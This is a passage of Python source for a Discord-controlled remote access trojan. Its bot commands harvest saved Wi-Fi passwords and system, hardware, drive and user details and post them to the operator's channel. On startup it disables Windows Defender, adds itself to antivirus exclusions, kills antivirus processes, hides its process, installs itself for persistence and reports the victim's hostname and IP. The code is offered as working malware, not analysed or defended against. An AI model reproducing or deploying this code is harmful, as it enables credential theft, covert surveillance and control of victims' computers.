                    passwords.append(f"{name}: <No password found>")

            except Exception as e:
                passwords.append(f"{name}: <Error retrieving password>")

        if passwords:
            output = (
                "**WiFi Passwords:**\n```\n"
                + "\n".join(passwords)
                + f"\n```{watermark()}"
            )
            if len(output) > 2000:
                parts = [output[i : i + 2000] for i in range(0, len(output), 2000)]
                for part in parts:
                    await ctx.send(part)
            else:
                await ctx.send(output)
        else:
            await ctx.send(f"No WiFi profiles found{watermark()}")
    except Exception as e:
        await ctx.send(f"❌ Error getting WiFi passwords: {str(e)}{watermark()}")

@bot.command()
async def systeminfo(ctx):
    try:
        result = subprocess.check_output("systeminfo", shell=True, text=True)
        await ctx.send(f"**System Info:**\n```\n{result[:1900]}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting system info: {e}{watermark()}")

@bot.command()
async def cpu(ctx):
    try:
        result = subprocess.check_output("wmic cpu get name", shell=True, text=True)
        await ctx.send(f"**CPU Info:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting CPU info: {e}{watermark()}")

@bot.command()
async def gpu(ctx):
    try:
        result = subprocess.check_output(
            "wmic path win32_VideoController get name", shell=True, text=True
        )
        await ctx.send(f"**GPU Info:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting GPU info: {e}{watermark()}")

@bot.command()
async def ram(ctx):
    try:
        result = subprocess.check_output(
            "wmic memorychip get capacity", shell=True, text=True
        )
        lines = result.strip().split("\n")[1:]
        total_bytes = sum(int(line.strip()) for line in lines if line.strip())
        total_gb = round(total_bytes / (1024**3), 2)

        result = subprocess.check_output(
            "wmic memorychip get speed,partnumber,manufacturer", shell=True, text=True
        )
        await ctx.send(
            f"**RAM Info:**\nTotal: {total_gb} GB\n```\n{result.strip()}\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting RAM info: {e}{watermark()}")

@bot.command()
async def drives(ctx):
    try:
        result = subprocess.check_output(
            "wmic logicaldisk get name,size,freespace,description",
            shell=True,
            text=True,
        )
        lines = result.strip().split("\n")

        output_lines = []
        headers = lines[0].split()
        output_lines.append(f"{'Drive':<6} {'Type':<15} {'Total':<10} {'Free':<10}")

        for line in lines[1:]:
            if not line.strip():
                continue
            parts = line.split()
            if len(parts) >= 4:
                drive = parts[0]
                desc = " ".join(parts[1:-2])
                size_bytes = int(parts[-2]) if parts[-2].isdigit() else 0
                free_bytes = int(parts[-1]) if parts[-1].isdigit() else 0

                size_gb = round(size_bytes / (1024**3), 2) if size_bytes else 0
                free_gb = round(free_bytes / (1024**3), 2) if free_bytes else 0

                output_lines.append(
                    f"{drive:<6} {desc:<15} {size_gb:>5} GB {free_gb:>5} GB"
                )

        await ctx.send(
            f"**Drives Info:**\n```\n" + "\n".join(output_lines) + f"\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting drives info: {e}{watermark()}")

@bot.command()
async def hostname(ctx):
    try:
        result = socket.gethostname()
        await ctx.send(f"**Hostname:** `{result}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting hostname: {e}{watermark()}")

@bot.command()
async def osinfo(ctx):
    try:
        result = subprocess.check_output("ver", shell=True, text=True)
        await ctx.send(f"**OS Version:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting OS info: {e}{watermark()}")

@bot.command()
async def user(ctx):
    try:
        result = os.getlogin()
        await ctx.send(f"**Current User:** `{result}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting current user: {e}{watermark()}")

@bot.event
async def on_ready():

    disable_defender()
    add_exclusion(sys.argv[0])
    kill_av_processes()
    hide_process()
    add_to_startup()

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    for channel in bot.get_all_channels():
        if isinstance(channel, TextChannel):
            try:
                await channel.send(
                    f"@everyone\n"
                    f"✅ **Connected - !help for command info.**\n"
                    f"• Hostname: `{hostname}`\n"
                    f"• IP: `{ip_address}`\n"
                    f"• Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                    f"{watermark()}"
                )
                break
            except:
                continue

    print(f"Logged in as {bot.user.name}")
    bot.loop.create_task(send_periodic_updates())

ssl_context = ssl.create_default_context()
ssl_context.load_verify_locations(certifi.where())

async def start_bot():
    async with aiohttp.ClientSession() as session:
        async with bot:
            bot.http.connector = aiohttp.TCPConnector(ssl=ssl_context)
            await bot.start(TOKEN)

asyncio.run(start_bot())
